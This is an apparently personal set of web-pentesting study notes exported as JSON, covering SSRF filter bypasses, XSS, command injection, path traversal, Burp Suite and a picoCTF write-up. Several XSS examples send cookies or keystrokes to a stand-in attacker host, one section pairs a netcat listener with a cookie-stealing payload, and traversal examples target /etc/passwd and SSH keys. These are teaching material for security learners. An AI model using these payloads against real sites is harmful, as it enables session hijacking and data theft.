List_\n\nAll requests are accepted apart from resources specified in a list or matching a particular pattern.\n\nA Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations.\n\nA specific endpoint to restrict access is the `localhost`/`127.0.0.1`, which may contain server performance data or further sensitive information.\n\nAttackers can bypass a Deny List by using alternative localhost references such as `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001` or subdomains that have a DNS record which resolves to `127.0.0.1` such as `127.0.0.1.nip.io`.\n\nAlso, in a cloud environment, it would be beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address `169.254.169.254`.\n\n### _Allow List_\n\nAn allow list is where all requests get denied unless they appear on a list or match a particular pattern, eg. a rule that an URL used in a parameter must begin with `https://website.thm`.\n\nAn attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as `https://website.thm.attackers-domain.thm`. The application logic would now allow this input and let an attacker control the internal HTTP request.\n\n### Open Redirect\n\nAn open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address, e.g `https://website.thm/link?url=https://tryhackme.com`. This endpoint was created for statistics purposes.\n\nBut imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with `https://website.thm/`. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/XSS":{"title":"Cross-site Scripting","content":"\n_Cross-Site Scripting_, is an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.\n\nCross-site scripting vulnerabilities are extremely common:\n\n- [XSS found in Shopify](https://hackerone.com/reports/415484)\n- [$7,500 for XSS found in Steam chat](https://hackerone.com/reports/409850)\n- [$2,500 for XSS in HackerOne](https://hackerone.com/reports/449351)\n- [XSS found in Infogram](https://hackerone.com/reports/283825)\n\n## XSS payloads\n\nThe XSS [[payload]] is the JavaScript code we wish to be executed on the targets computer.\n\nThere are two parts to the payload:\n\n- _The intention_ - it's is what you wish the JavaScript to actually do\n- _The modification_ - it's the changes to the code we need to make it execute as every scenario is different\n\n## Examples of XSS intentions\n\n- Proof of Concept - the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website\n  - `\u003cscript\u003ealert('XSS');\u003c/script\u003e`\n- Stealing user session from Cookies\n  - `\u003cscript\u003efetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));\u003c/script\u003e`\n- Key logging\n  - `\u003cscript\u003edocument.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}\u003c/script\u003e`\n- Targeted at the business logic\n  - a lot more specific than the examples above\n  - calling a particular network resource or a JS fn, e.g. `user.changeEmail()`\n  - `\u003cscript\u003euser.changeEmail('attacker@hacker.thm');\u003c/script\u003e`\n\n## Types of XSS\n\n- [[cybersecurity/knowledge/pentesting/reflected-xss]]\n- [[cybersecurity/knowledge/pentesting/stored-xss]]\n- [[cybersecurity/knowledge/pentesting/dom-based-xss]]\n- [[cybersecurity/knowledge/pentesting/blind-xss]]\n\n## Escaping HTML\n\nViewing the page source, you can see your name reflected inside the value attribute of the input tag:\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)\n\nLet's say, we have a form that takes a name and renders it inside the `input` tag:\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n  \u003ch2\u003eHello, \u003cinput value=\"Adam\" /\u003e\u003c/h2\u003e\n\u003c/div\u003e\n```\n\nThe JavaScript payload can't run it from inside the `input` tag. We need to escape the `input` tag first so the payload can run properly. We can do this with the following payload:\n\n```\n\"\u003e\u003cscript\u003ealert('THM');\u003c/script\u003e\n```\n\nThe important part of the payload is the `\"\u003e` which closes the value parameter and then closes the input tag.\n\nThis now closes the input tag properly and allows the JavaScript payload to run:\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n  \u003ch2\u003e\n    Hello, \u003cinput value=\"\" /\u003e\n    \u003cscript\u003e\n      alert(\"THM\");\n    \u003c/script\u003e\n    \"\u003e\n  \u003c/h2\u003e\n\u003c/div\u003e\n```\n\nIn case of `textarea`, escaping looks a bit different. We're closing the `textarea` tag first:\n\n```html\n\u003c!-- payload --\u003e\n\u003c/textarea\u003e\u003cscript\u003ealert(\"THM\");\u003c/script\u003e\n```\n\n```html\n\u003cdiv class=\"text-center\"\u003e\n\t\u003ch2\u003eHello, \u003ctextarea\u003e\u003c/textarea\u003e\u003cscript\u003ealert(\"THM\");\u003c/script\u003e\u003c/textarea\u003e\u003c/h2\u003e\n\u003c/div\u003e\n```\n\nTo get around the filters, we can also take advantage of the additional attributes of the tags, such as the `onload` event of an `img` tag. `onload` executes the code of your choosing once the image specified in the `src` attribute has loaded onto the web page:\n\n```\n/images/cat.jpg\" onload=\"alert('THM');` \n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/black-hats":{"title":"Black hats","content":"\nA commonly used term for malicious hackers.\n\nOut of respect for _good hackers_, it is advised to use these terms rather than the generic term _hacker_:\n\n- Threat actor\n- Cyber criminal\n- Black hat hackers, or _black hats_ for short\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/blind-xss":{"title":"Blind XSS","content":"\n## Blind XSS\n\nBlind XSS is similar to a [[cybersecurity/knowledge/pentesting/stored-xss]] in that your [[cybersecurity/knowledge/glossary/payload]] gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.\n\n## Example Scenario\n\nA website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.\n\n## Potential Impact\n\nUsing the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed.\n\nNow the attacker could potentially hijack the staff member's session and have access to the private portal.\n\n## How to test for Blind XSS\n\nWhen testing for Blind XSS vulnerabilities, you need to ensure your payload has a callback (usually an HTTP request). This way, you know if and when your code is being executed.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/cmd-injection":{"title":"Command Injection","content":"\n_Command injection_ is the abuse of an application's behaviour to execute commands on the operating system. The webserver will process this code and execute it under the privileges and access controls of the user who is running that application (the app is running **on a** webserver **by** user).\n\nCommand injection is also often known as _Remote Code Execution_ because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the system, read files, data, etc.\n\n## Severity of Command Injection\n\n- One of the top ten vulnerabilities reported by [Contrast Security AppSec., 2019](https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report)i ntelligence report\n- the OWASP framework constantly proposes vulnerabilities of this nature as one of the [top ten](https://owasp.org/www-project-top-ten/) vulnerabilities of a web application\n\n## Detecting Command Injection\n\nProgramming languages often allow to make system calls on the OS, eg. taking input from file and searching for an entry into a file:\n\n```php\n\u003c?php\n$songs = \"/var/www/html/songs\"\n\nif (isset $_GET[\"title\"])) {\n\t$title = $_GET[\"title\"];\n\n\t$command = \"grep $title /var/www/html/songtitle.txt\"`;` -\n\tif ($search == \"\") {\n\t\t\t$return \"\u003cp\u003eThe requested song\u003c/p\u003e\u003cp\u003e $title does \u003c/p\u003e\u003cb\u003enot\u003c/b\u003e\u003cp\u003e exist!\u003c/p\u003e\";\n\t} else {\n\t\t$return \"\u003cp\u003eThe requested song\u003c/p\u003e\u003cp\u003e $title does \u003c/p\u003e\u003cb\u003eexist!\u003c/b\u003e\";\n\t}\n\n\techo $return;\n?\u003e\n```\n\n\u003e [!tip] It's just an example\n\u003e\n\u003e The content of `songtitle.txt` would typically be kept in the DB.\n\nApplications that use user input to populate system commands with data can often be combined in unintended behaviour, eg. with the shell operators `;`, `\u0026` and `\u0026\u0026` we can combine system commands and execute all of them.\n\nCommand Injection can be detected in mostly one of two ways:\n\n1.  Blind command injection\n    - no direct output from the application when testing [[cybersecurity/knowledge/glossary/payload]]s\n    - we need to investigate the app behaviour to determine if the payload was successful\n2.  Verbose command injection\n    - we have a direct feedback from the app once we tested a payload, e.g. with testing for `whoami` cmd\n\n### Detecting Blind Command Injection\n\nBlind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable.\n\nFor this type of command injection, we may need to use payloads that will cause some time delay. For example, the `ping` and `sleep` commands are significant payloads to test with. Using `ping` as an example, the application will hang for *x* seconds in relation to how many *pings* you have specified.\n\nAnother method of detecting blind command injection is by **forcing some output**. This can be done by using redirection operators such as `\u003e`, e.g., we can tell the web application to execute commands such as `whoami` and redirect that to a file. We can then use a command such as `cat` to read this newly created file’s contents.\n\nThe `curl` command is a great way to test for Command Injection, because we are able to use it to deliver data to and from an application in the payload:\n\n```sh\n$ curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`\n```\n\n### Detecting Verbose Command Injection\n\nVerbose command injection is when the application gives you feedback or output as to what is happening or being executed, e.g., the output of commands such as `ping` or `whoami` is directly displayed on the web application.\n\n## Useful payloads\n\n### Linux\n\n- `whoami`\n- `ls` - we may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.\n- `ping` - it will invoke the application to hang\n- `sleep` - it will invoke the application to hang, useful if the machine does not have `ping` installed.\n- `nc` - [[cybersecurity/knowledge/tools/netcat]] can be used to spawn a [[reverse shell]] onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges\n\n### Windows\n\n- `whoami`\n- `dir`\n- `ping`\n- `timeout` - similarly to Linux' `sleep` it's useful if the attacked machine does not have `ping` installed\n\n## Preventing Command Injection\n\n- Don't use vulnerable fns, like PHPs `exec`, `passthru`, `system`\n- Filter and sanitise inputs by specifying formats or types of data that users can submit\n  - removing special characters from the input content (`\u003e`, `\u0026`, `/`)\n  - using `\u003cinput pattern=\"[0-9+]\"\" /\u003e`\n  - using PHPs [`filter_input`](https://www.php.net/manual/en/function.filter-input.php)\n\n## Bypassing filters\n\nWe can abuse the logic behind an application to bypass filters, eg. an application may strip out quotation marks, but we can instead use the hexadecimal value of this to achieve the same result:\n\n```php\n$payload = \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n```\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/dom-based-xss":{"title":"DOM-based XSS","content":"\n[[development/web/glossary/DOM]] Based [[cybersecurity/knowledge/pentesting/XSS]] is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.\n\nExecution occurs when the website JavaScript code acts on input or user interaction.\n\n## Example scenario\n\nThe website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.\n\n## Potential impact\n\nCrafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.\n\n## How to test for Dom Based XSS\n\nDOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code.\n\nYou'd need to look for parts of the code that access certain variables that an attacker can have control over, such as `window.location.x` parameters.\n\nWhen you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/lfi-rfi-prevention":{"title":"LFI/RFI prevention","content":"\nTo prevent the file inclusion vulnerabilities ([[cybersecurity/knowledge/pentesting/LFI]] and [[cybersecurity/knowledge/pentesting/RFI]]) it's wise to:\n\n- Keep system and services, including webapp frameworks, updated with the latest version\n- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information\n- Use a Web Application Firewall (WAF)\n- Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, eg `allow_url_fopen` and `allow_url_include`\n- Carefully analyze the web application and allow only protocols and PHP wrappers that are in need\n- Never trust user input and use **input validation** against file inclusion\n- Implement _whitelisting_ for file names and locations as well as _blacklisting_\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/null-byte":{"title":"Null Byte Injection","content":"\nUsing _Null Bytes_ is an injection technique where URL-encoded representation such as `%00` or `0x00` in hex with user-supplied data to _terminate_ strings (disregarding whatever comes after the Null Byte.\n\nBy adding the Null Byte at the end of the [[cybersecurity/knowledge/glossary/payload]], we tell the `include` function to ignore anything after Null Byte which may look like:\n\n```\ninclude(\"languages/../../../../../etc/passwd%00\").\".php\");\n```\n\nEffectively making the function call to be:\n\n```\ninclude(\"languages/../../../../../etc/passwd\");\n```\n\n\u003e [!tip] The `%00` trick has been fixed in PHP 5.3.4\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/path-traversal":{"title":"Path Traversal","content":"\n_Path Traversal_ (aka _Directory traversal_ or _dot dot slash_ attack) is a web security vulnerability allowing an attacker to read operating system resources (e.g local files on the machine serving an application).\n\nThe attacker exploits this vulnerability by manipulating and abusing the **web application's URL** to locate and access files or directories stored outside the application's root directory.\n\nPath traversal vulnerabilities occur when the user's input is passed to a function such as\n[`file_get_contents`](https://www.php.net/manual/en/function.file-get-contents.php) in PHP.\n\n\u003e [!tip] `file_get_contents` is not the main contributor to the vulnerability.\n\u003e\n\u003e Often poor input validation or filtering is the **actual** cause.\n\n## Example\n\nLet's say we have an endpoint to read file contents:\n\n```\nhttp://webapp.com/get.php?file=CV.pdf\n```\n\nWe can test out the `file` query param by adding non-obvious [[cybersecurity/knowledge/glossary/payload]]s to see how the web application behaves:\n\n```\nhttp://webapp.com/get.php?file=../../../../etc/passwd\n```\n\nIf there is no input validation, we might be luchky enough to retrieve files from other directiories.\nAs a result, the web application sends back the file's content to the user.\n\n## Example (Windows)\n\nIf the application runs on a Windows Server, we need to provide Windows paths, e.g.\n\n```\nhttp://webapp.com/get.php?file=../../../../boot.ini\nhttp://webapp.com/get.php?file=../../../../Windows/win.ini\n```\n\n## Useful files to look for\n\n### Linux\n\n- `/etc/issue` - contains a message or system identification to be printed before the login prompt.\n- `/etc/profile` - controls system-wide default variables, such as `export`s, File creation mask ([[linux/glossary/umask]]), Terminal types, Mail messages to indicate when new mail has arrived\n- `/proc/version` - specifies the version of the Linux kernel\n- `/etc/passwd` - has all registered user that has access to a system\n- `/etc/shadow` - contains information about the system's users' passwords\n- `/root/.bash_history` - contains the history commands for root user\n- `/var/log/dmessage` - contains global system messages, including the messages that are logged during system startup\n- `/var/mail/root` - all emails for root user\n- `/root/.ssh/id_rsa` - Private `ssh` keys for a `root` or any known valid user on the server\n- `/var/log/apache2/access.log` - the accessed requests for Apache webserver\n\n### Windows\n\n- `C:\\boot.ini` contains the boot options for computers with BIOS firmware\n\n---\n\n## See also\n\n- [[cybersecurity/knowledge/pentesting/LFI]]\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/practical-xss":{"title":"Practical XSS example","content":"\nLet's say we want to exploit a [[cybersecurity/knowledge/pentesting/blind-xss]] vulnerability we've found.\n\nWe have a Support Ticket system in which we may create tickets, which content `textarea` field is vulnerable to [[cybersecurity/knowledge/pentesting/XSS]].\n\nWe know we're able to run JavaScript code, but we don't have access to the content on our own, so we can't list anything. But we can expand the [[cybersecurity/knowledge/glossary/payload]] to send sensitive content to our own server using [[cybersecurity/knowledge/tools/netcat]].\n\nBecause we're dealing with Support Ticket system, it's reasonable to assume that a staff member will also view this ticket which we could get to execute JavaScript.\n\nSome helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session.\n\nTo do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information:\n\n```shell-session\n$ nc -nlvp 9001\n```\n\nNow that we've set up the method of receiving the exfiltrated information, we build the payload:\n\n`\u003c/textarea\u003e\u003cscript\u003efetch('http://{URL_OR_IP:PORT}?cookie=' + btoa(document.cookie) );\u003c/script\u003e`\n\n\u003e [!tip] `btoa()` encodes the victim's cookies with base64.\n\nOnce the user opens a ticket, we can decode the cookies.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/purple-team":{"title":"Purple Team","content":"\nSometimes companies will have a _purple team_.\n\n\u003e Mix red and blue and you get purple!\n\u003e\n\u003e ~ Phillip L. Wylie, [[private/the-pentesters-blueprint|The Pentesters Blueprint]]\n\nA purple team is simply a small group of people who help to facilitate communication between the red team and blue team.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/red-team":{"title":"Red team","content":"\nRed team members (or _red teamers_) share similarities to [[cybersecurity/knowledge/pentesting/pentest|pentesters]], with a more targeted job role.\n\nWhile the pentesters look to uncover many vulnerabilities across systems to keep cyber-defence in good standing, red teamers are enacted to test the company's detection and response capabilities.\n\nRed teamers perform adversarial simulation to simulate malicious behaviorand test the [[blue team]]. This involves imitating cyber criminals' actions to:\n\n- emulate malicious attacks\n- uncover exploitable vulnerabilities\n- retaining access\n- avoiding detection.\n\nTypicaly the red team assessments run for up to a month and are held by team external to the company. They are often best suited to organisations with mature security programs in place.\n\nThe ultimate goal is to:\n\n- Assess organisations' security controls, threat intelligence, and [[cybersecurity/knowledge/pentesting/IR]] procedures\n- Evaluate and report on insights, with actionable data for companies to avoid real-world instances\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/red-vs-blue":{"title":"Red vs Blue Teams","content":"\nBoth [[cybersecurity/knowledge/pentesting/red-team|red team]] and [[blue-team]] work **toward** improving an organization's security, but they do so differently:\n\n- A red team plays the role of the attacker by trying to find vulnerabilities and break through cybersecurity defenses\n- A blue team defends against attacks and responds to incidents when they occur. They also use the red team's findings to harden their networks\n\nThe [[cybersecurity/knowledge/pentesting/purple-team|purple team]] may exist within the organisation as well.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/reflected-xss":{"title":"Reflected XSS","content":"\n_Reflected_ [[cybersecurity/knowledge/pentesting/XSS]] happens when user-supplied data in an HTTP request is included in the webpage source without any validation, e.g.\n\nA website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the `error` parameter in the query string.\n\n```\nhttps://website.thm/?error=Invalid input Detected\n```\n\nIf the application doesn't check the contents of the error parameters, we could insert malicious code:\n\n```\nhttps://website.thm/?error=\u003cscript src=\"https://attacker.thm/evil.js'\u003e\u003c/script\u003e\n```\n\nThis would get rendered as\n\n```html\n\u003cdiv class-\"alert alert-danger\"\u003e\n\t\u003cp\u003e\n\t\t\u003cscript src=\"https://attacker.thm/evil.js\"\u003e\u003c/script\u003e\n\t\u003c/p\u003e\n\u003c/div\u003e\n```\n\n## Example scenario\n\n1. Attacker sends a link with malicious [[cybersecurity/knowledge/glossary/payload]] to a victim\n2. Victim clicks the link and is taken to a vulnerable site\n3. Link containing attacker's script is executed on website\n4. The gathered data (e.g. stolen session) is sent back to the attacker\n\nThe attacker could send links or embed them into an `iframe` to execute code on the victim browser, potentially revealing sensitive information.\n\n## How to test for Reflected XSS\n\nManually test every possible point of entry, including:\n\n- Parameters in the URL Query String\n- URL File Path\n- Sometimes HTTP Headers (although unlikely exploitable in practice)\n\nOnce you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/pentesting/stored-xss":{"title":"Stored XSS","content":"\nThe [[cybersecurity/knowledge/pentesting/XSS]] [[cybersecurity/knowledge/glossary/payload]] is stored on the web application (e.g. in a DB) and then gets run when other users visit the site or web page.\n\n## Example scenario\n\nA blog website that allows users to post comments.\n\nThese comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.\n\n## Potential Impact\n\nThe malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.\n\n## How to test for Stored XSS\n\nManually test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to, eg.:\n\n- Comments on a blog\n- User profile information\n- Website Listings\n\nSometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, e.g. an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/":{"title":"Tools","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/burp/":{"title":"Burp Suite","content":"\n_Burp Suite_ is a framework that is the industry standard tool for web app [[private/cybersec/pentesting/|pentesting]].\n\nBurp Suite is also commonly used when assessing mobile applications, as the same features which make it so attractive for web app testing translate almost perfectly into testing the APIs powering most mobile apps.\n\nBurp can capture and manipulate all of the traffic between an attacker and a webserver: this is the core of the framework. After capturing requests, we can choose to send them to various other modules of Burp. This ability to intercept, view, and modify web requests prior to them being sent to the target server (or, in some cases, the responses before they are received by our browser), makes Burp Suite perfect for any kind of manual web app testing.\n\nThere are various different editions of Burp Suite available:\n\n- Burp Suite Community edition\n  - free to use for any (legal) non-commercial use.\n- Burp Suite Professional\n  - unrestricted version of Burp Suite Community, has additional features:\n    - automated vulnerability scanner\n    - a fuzzer/bruteforcer that isn't rate limited\n    - saving projects for future use\n    - report generation\n    - A built-in API to allow integration with other tools\n    - unrestricted extensions support\n    - Burp Suite Collaborator (a unique request catcher self-hosted/running on a Portswigger server)\n    - $399/user/year\n- Burp Suite Enterprise\n  - used for automated, continuous scanning (periodically), similarly to how [[Nessus]] performs automated infrastructure scanning\n\n## Burp Suite Community features\n\n- [[cybersecurity/knowledge/tools/burp/proxy]]\n- [[cybersecurity/knowledge/tools/burp/repeater]]\n- [[cybersecurity/knowledge/tools/burp/intruder]]\n- [[cybersecurity/knowledge/tools/burp/decoder]]\n- [[cybersecurity/knowledge/tools/burp/comparer]]\n- [[cybersecurity/knowledge/tools/burp/sequencer]]\n- Extensions support through [[cybersecurity/knowledge/tools/burp/extender]] module\n\n## See also\n\n- [[cybersecurity/knowledge/tools/burp/configuration|Useful configuration settings]]\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/burp/comparer":{"title":"Burp Comparer","content":"\n*Burp Comparer* allows us to compare two pieces of data at either word or byte level.\n\nEven though it's not something that is unique to Burp Suite, being able to send pieces of data directly into a comparison tool with a single keyboard shortcut can speed things up considerably.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/burp/configuration":{"title":"Useful configuration settings","content":"\n## User Settings\n\nApplied globally; can be overwritten in the Project Settings.\n\nThere are four main sub-sections of the User options tab:\n\n- _Connections_ - controls how Burp makes connections to targets\n  - we can set a proxy for Burp Suite to connect through - useful if we want to use Burp Suite through a network pivot\n- _TLS_ - enables/disables various TLS options\n  - a place to upload client certificates should a web app require us to use one for connections\n- _Display_ - configuring various options to do with the rendering engine in [[cybersecurity/knowledge/tools/burp/repeater]]\n\n## Project Settings\n\nIn _Community_ edition we can't save projects, effectively meaning these settings will reset each time we close Burp.\n\n- _Connections_ - same as in User Settings with few differences, eg.\n  - the _Hostname Resolution_ - allowing you to map domains to IPs directly within Burp Suite\n  - _Out-of-Scope Requests_ settings - enabling us to determine whether Burp will send requests to anything we aren't explicitly targeting\n- *HTTP* - defines how Burp handles various aspects of the HTTP protocol, eg.\n  - whether it follows redirects\n  - how to handle unusual response codes\n- _TLS_\n  - showing us a list of public server certificates for sites that we have visited\n- _Sessions_\n  - allows us to define how Burp obtains, saves, and uses session cookies that it receives from target sites\n  - allows us to define macros which we can use to automate things such as logging into web applications\n  - [[cybersecurity/knowledge/tools/burp/cookie-jar]]\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/burp/proxy":{"title":"Burp Proxy","content":"\n_Burp Proxy_ allows us to intercept and modify requests/responses between\nourselves and the target when interacting with web apps. These can then be manipulated or sent to other tools for further processing before being allowed to continue to their destination.\n\nWe can also do various other things with the request, such as\n\n- copying it as a cURL command\n- saving it to a file\n- etc.\n\nBurp will (by default) log requests made through the proxy, no matter if the intercept is on/off. Useful for going back and analysing prior requests, even if we didn't specifically capture them when they were made.\n\nBurp will also log WebSocket communication, which can be helpful for web app analysis.\n\nRequests can be sent to other modules through _HTTP/Websocket history_ -\u003e _Right-click_ -\u003e _Send to..._\n\n## Proxy Options\n\n### Intercept responses based on the following rules\n\nThe proxy will not intercept server responses by default unless we explicitly ask it to on a per-request basis. We can override this by selecting the _Intercept responses based on the following rules_.\n\nThe _Or Request Was Intercepted_ rule is good for catching responses to all requests that were intercepted by the proxy.\n\nThe _And URL Is in target scope_ is another very good default rule; we will look at scoping later in this room.\n\nWe can also make our own rules.\n\n### Match And Replace\n\n_Match And Replace_ section allows us to perform regexes on incoming and outgoing requests, eg. we can automatically change the user agent to emulate a different web browser in outgoing requests or remove all cookies being set in incoming requests.\n\nWe can also make our own rules.\n\n## Connecting through the Proxy\n\nThere are two ways to proxy our traffic through Burp Suite:\n\n- using the embedded browser\n- using our local browser to proxy our traffic through Burp\n\n### using embedded browser\n\nBurp Suite comes with a built-in Chromium browser that's preconfigured to use Burp Proxy without any modifications. We can start it directly from Burp Proxy.\n\n\u003e [!tip] Burp Browser Error\n\u003e\n\u003e We may need to _Allow the embedded browser to run without a sandbox_ in _Project Options_ -\u003e _Misc_ -\u003e _Embedded Browser_ if we run Burp as `root`. This, however, isn't recommended in enviroments other than VM for security reasons.\n\n### using local browser\n\nThe Burp Proxy works by opening a web interface on `127.0.0.1:8080` (by default). We need to redirect all of our browser traffic through this port so we can start intercepting it.\n\nWe can do this by altering our browser settings (not recommended) or with a [FoxyProxy Basic](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb) extension.\n\nWe need to create Burp Proxy config in FoxyProxy and enable this proxy setting:\n\n```\nTitle: Burp (or anything else)\nProxy IP: 127.0.0.1\nPort: 8080\n```\n\nFrom now on we can intercept requests made by our browser.\n\n## Intercepting Responses to particular requests\n\n_HTTP History_ -\u003e _Right-Click_ -\u003e _Do Intercept_ -\u003e _Response to this Request_\n\n## Proxying HTTPS traffic\n\nBy default the Portswigger [[cybersecurity/knowledge/glossary/CA]] isn't authorised to secure the connection.\n\nFortunately, Burp provides a certificate as a workaround. We need to add it to a list of trusted [[cybersecurity/knowledge/glossary/CA]]s manually.\n\nWith the proxy activated we need to go to [http://burp/cert](http://burp/cert); this will download a file called `cacert.der`. On macOS we need to install it to iCloud Keychain, set it to be always trusted and then restart the browser. This will enable us to proxy the HTTPS traffic.\n\n## Scoping\n\nSetting a _scope_ for the project allows us to define what gets proxied and logged.\n\nWe can restrict Burp Suite to *only* target the web app that we want to test.\n\n_Target_ tab -\u003e _Right Click_ the target from the list -\u003e _Add To Scope_.\n\nWe can check the scope by switching to the _Scope_ sub-tab.\n\nThe Scope sub-tab allows us to control what we are targeting by either *Including* or *Excluding* domains / IPs.\n\nTo disable intercepting everything that's not in the scope, we need to go to Proxy Options sub-tab and select _And URL Is in target scope_ from the Intercept Client Requests section.\n\n## Site Mapping\n\n_Site Map_ option allows us to map out the targeted web app in a tree structure - every visited subpage will show up here, allowing us to automatically generate a site map for the target simply by browsing around the web app - useful for mapping out an API; whenever we visit a page, any API endpoints that the page retrieves data from will show up here\n\n## Issue definitions\n\nWhilst we don't have access to the vulnerability scanner in Burp Suite Community, we do still have access to a list of all the vulnerabilities it looks for. The _Issue Definitions_ section provides a huge list of web vulnerabilities (with descriptions and references) which we can draw from should we need citations for a report or help describing a vulnerability\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/knowledge/tools/burp/repeater":{"title":"Burp Repeater","content":"\n_Burp Repeater_ allows to capture, modify, then resend the same request numerous times.\n\nUseful for:\n\n- crafting a [[cybersecurity/knowledge/glossary/payload]] through trial and error (e.g. in an [[cybersecurity/knowledge/pentesting/SQLi]])\n- testing the functionality of an endpoint for flaws\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/":{"title":"Write-Ups","content":"\nLately, I've been going through some cybersecurity basics with _Capture The Flags_. This directory keeps the write-ups for them.\n","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/":{"title":"picoCTF","content":"","lastmodified":"2023-01-10T20:59:18.209284331Z","tags":null},"/cybersecurity/write-ups/picoCTF/GET-aHEAD":{"title":"GET aHEAD","content":"\n[Link to the exercise](https://play.picoctf.org/practice/challenge/132)\n\n## Steps\n\nFirst, I've opened the \"server\" application. What I saw were two buttons that changed the background color on click. From the source code I got to know that a background color to set was determined by the request method:\n\n- `GET /index.php` to the red background\n- `POST /index.php` to the blue one\n\nUsing [Burp Suite] I've intercepted the requests and changed their method type. First I tried the `PUT` method, which made the background white. But it wasn't enough to solve the puzzle. I tried to use `DELETE` then with the same results.\n\nA bit bummed I took a look at the exercise name, and even though I never heard of the [`HEAD` request method](https://reqbin.com/Article/HttpHead) before, I tried to use that. Bingo 😁\n\nUltimately, the flag was hidden in the `HEAD /index.php` request-response.\n\n## Flag\n\nI don't remember and I closed Burp Suite already 